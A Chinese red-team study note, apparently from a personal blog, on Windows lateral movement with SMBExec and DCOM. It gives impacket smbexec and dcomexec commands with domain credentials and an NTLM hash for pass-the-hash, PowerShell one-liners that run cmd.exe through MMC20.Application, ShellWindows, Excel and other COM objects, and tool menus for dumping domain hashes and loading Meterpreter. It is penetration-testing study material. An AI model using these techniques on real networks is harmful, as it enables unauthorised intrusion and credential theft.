---
title: 【内网学习笔记】23、SMBExec 与 DCOM 的使用
date: 2021-09-04 11:07:01
id: 210904-110701
img: https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902171015.png
tags:
- 红队
- 学习笔记
- 内网
categories:
- 内网学习笔记
---

## 1、SMBExec

利用 SMBExec 可以通过文件共享（admin$、c$、ipc$、d$）在远程系统中执行命令，它的工作方式类似于 PsExec

### C++ 版

C++ 版项目地址：[https://github.com/sunorr/smbexec](https://github.com/sunorr/smbexec)

一看这个项目是 8 年前上传的了，然后试了用 VS2019 没编译成功，而且目前各大杀软也都查杀这个工具了，所以这个就不看了，直接看 impacket 里的同类工具。

### impacket 版

在 impacket 工具包里包含了 smbexec.py 工具，使用起来也很简单。

```
python3 smbexec.py teamssix.com/administrator:1qaz@WSX@192.168.7.7
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902153131.png)

### Linux 跨平台 Windows 远程命令执行

smbexec 工具包下载地址：[https://github.com/brav0hax/smbexec](https://github.com/brav0hax/smbexec)

这里安装以 Kali 为例

```
git clone https://github.com/brav0hax/smbexec.git
cd smbexec/
chmod +x install.sh
sudo ./install.sh
```

安装时需要选择操作系统，根据自己情况选择就行，如果是 Kali 就选择 Debain，然后选择安装目录，直接回车默认 /opt 目录即可。

安装完后，在终端里输入 smbexec 就会显示 smbexec 的主菜单，分别如下：

```
1. System Enumeration   // 获取系统信息
2. System Exploitation  // 执行系统命令
3. Obtain Hashes        // 获取系统哈希
4. Options              // 一些其他操作
5. Exit                 // 退出
```

选择菜单 1 System Enumeration 有以下选项：

```
1. Create a host list                 // 扫描目标 IP 段中存活的主机
2. Check systems for Domain Admin     // 获取目标系统中的管理员
3. Check systems for logged in users  // 获取当前登录目标系统的用户
4. Check systems for UAC              // 获取目标系统 UAC 的状态
5. Enumerate Shares                   // 获取目标系统中的网络共享目录
6. File Finder                        // 搜索目标系统中的敏感文件
7. Remote login validation            // 获取目标系统中远程登录的用户
8. Main menu                          // 返回主菜单
```

选择菜单 2 System Exploitation 有以下选项：

```
1. Create an executable and rc script    // 生成一个 meterpreter Payload 并在目标系统中运行它
2. Disable UAC                           // 关闭远程主机的 UAC
3. Enable UAC                            // 开启远程主机的 UAC
4. Execute Powershell                    // 执行一个 PowerShell 脚本
5. Get Shell                             // 使用基于 PsExec 的方式获得目标系统的 Shell
6. In Memory Meterpreter via Powershell  // 通过 PowerShell 在内存中插入 Meterpreter Payload
7. Remote system access                  // 远程访问系统
8. Main menu                             // 返回主菜单
```

选择菜单 3 Obtain Hashes 有以下选项：

```
1. Domain Controller            // 获取域控哈希
2. Workstation & Server Hashes  // 获取本地哈希
3. Main menu                    // 返回主菜单
```

选择菜单 4 Options 有以下选项：

```
1. Save State            // 保存当前状态
2. Load State            // 加载以前保存的状态
3. Set Thread Count      // 设置线程数
4. Generate SSL Cert     // 生成 SSL 证书
5. Enter Stealth Mode    // 进入安静模式
6. About                 // 关于
7. Main menu             // 返回主菜单
```

获取目标系统 UAC 的状态

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902163458.png)

获取目标系统中的网络共享目录

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902163631.png)

获取本地哈希

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902161205.png)

## 2、DCOM 在远程系统中的使用

COM 即组件对象模型 (Component Object Model，COM) ，是基于 Windows 平台的一套组件对象接口标准，由一组构造规范和组件对象库组成。

COM 是许多微软产品和技术如 Windows 媒体播放器和 Windows Server 的基础。

DCOM （分布式组件对象模型）是微软基于组件对象模型（COM）的一系列概念和程序接口，DCOM 是 COM（组件对象模型）的扩展。

它支持不同的两台机器上的组件间的通信，不论它们是运行在局域网、广域网、还是 Internet 上，利用这个接口，客户端程序对象能够向网络中另一台计算机上的服务器程序对象发送请求。

攻击者可使用 DCOM 进行横向移动，通过 DCOM 攻击者可在拥有适当权限的情况下通过 Office 应用程序以及包含不安全方法的其他 Windows 对象远程执行命令。

使用 DCOM 进行横向移动的优势之一在于，在远程主机上执行的进程将会是托管 COM 服务器端的软件。例如我们滥用 ShellBrowserWindow COM 对象，那么就会在远程主机的现有 explorer.exe 进程中执行。

对攻击者而言，这无疑能够增强隐蔽性，由于有大量程序都会向 DCOM 公开方法，因此防御者较难以监测所有程序。

### 在本地通过 DCOM 执行命令

1、获取 DCOM 程序列表

Get-CimInstance 是 PowerShell 3.0 以上的版本自带的，因此只有 Windows Server 2012 及以上的操作系统才会自带 Get-CimInstance 命令

```
Get-CimInstance Win32_DCOMApplication
```

在 Windows 7 和 Windows Server 2008 中可以使用 Get-WmiObject 替代 Get-CimInstance

```
Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication
```

2、使用 DCOM 执行任意命令

在 DCOM 程序列表中有个 MMC Application Class（MMC20.Application），这个 COM 对象可以编程 MMC 管理单元操作的组件脚本。

在本地以管理员权限启动一个 PowerShell，并执行以下命令

```
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","127.0.0.1"))
```

获得COM对象的实例后，还可以执行如下命令枚举这个 COM 对象中的不同方法和属性

```
$com.Document.ActiveView | Get-Member
```

在 MMC20.Application 中有个 ExecuteShellCommand 方法，我们可以拿它来执行命令，比如启动个计算器

```
$com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c calc.exe","Minimized")
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902171015.png)

除了 MMC20.Application 还有 ShellWindows、ShellBrowserWindow、Excel.Application 以及 Outlook.Application 等等可以被我们利用。

### 使用 DCOM 在远程主机上执行命令

在使用该方法时，需要具备以下条件：

- 具有本地管理员权限的 PowerShell
- 需要关闭目标系统的防火墙。
- 在远程主机上执行命令时，必须使用域管的 administrator 账户或者在目标主机上具有管理员权限的账户

1、调用 MMC20.Application 远程执行命令

```
$com = [Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.7.7"))
$com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c calc.exe","Minimized")
或者
[Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.7.7")).Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c calc.exe","Minimized")
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902175722.png)

2、调用 ShellWindows 远程执行命令

```
$com=[Activator]::CreateInstance([Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"192.168.7.7"))
$com.item().Document.Application.ShellExecute("cmd.exe","/c calc.exe","c:\windows\system32",$null,0)
或者
[Activator]::CreateInstance([Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"192.168.7.7")).item().Document.Application.ShellExecute("cmd.exe","/c calc.exe","c:\windows\system32",$null,0)
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902175207.png)

以上这两种方法均适用于Windows 7、Windows 10、Windows Server 2008、Windows Server 2016 的系统。

除了 MMC20.Application 和 ShellWindows，还有以下这几种 DCOM 对象可以被利用。

3、调用 Excel.Application 远程执行命令

```
$com = [activator]::CreateInstance([type]::GetTypeFromprogID("Excel.Application","192.168.7.7"))
$com.DisplayAlerts = $false
$com.DDEInitiate("cmd.exe","/c calc.exe")
```

4、调用 ShellBrowserWindow 远程执行命令

> 适用于 Windows 10 和 Windows Server 2012 R2 等版本的系统

```
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","192.168.7.7"))
$com.Document.Application.shellExecute("calc.exe")
或者
[activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","192.168.3.144")).Document.Application.shellExecute("calc.exe")
```

5、调用 Visio.Application 远程执行命令

> 前提是目标安装了 Visio

```
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Visio.Application","192.168.7.7"))
$com.[0].Document.Application.shellExecute("calc.exe")
或者
[activator]::CreateInstance([type]::GetTypeFromProgID("Visio.Application","192.168.7.7")).[0].Document.Application.shellExecute("calc.exe")
```

6、调用 Outlook.Application 远程执行命令

> 前提是目标安装了 Outlook

```
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Outlook.Application","192.168.7.7"))
$com.createObject("Shell.Application").shellExecute("192.168.7.7")
或者
[activator]::CreateInstance([type]::GetTypeFromProgID("Outlook.Application","192.168.7.7")).createObject("Shell.Application").shellExecute("calc.exe")
```

### dcomexec.py 脚本

Impacket 工具包里也提供了 DCOM 的利用脚本，该脚本可以提供一个类似于 wmiexec.py 脚本的半交互式 shell，不过使用的是 DCOM

dcomexec.py 脚本目前支持 MMC20.Application、ShellWindows 和 ShellBrowserWindow 对象。

```
python3 dcomexec.py teamssix.com/administrator:1qaz@WSX@192.168.7.7
```

或者只执行一条命令

```
python3 dcomexec.py teamssix.com/administrator:1qaz@WSX@192.168.7.7 ipconfig
```

如果只知道 hash 也可以用 hash 去连接

```
python3 dcomexec.py teamssix.com/administrator@192.168.7.7 -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210904110328.png)

> 参考文章：
>
> [https://cloud.tencent.com/developer/article/1752145](https://cloud.tencent.com/developer/article/1752145)
>
> [https://www.freebuf.com/articles/network/261454.html](https://www.freebuf.com/articles/network/261454.html)
>
> 更多信息欢迎关注我的微信公众号：TeamsSix

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png)
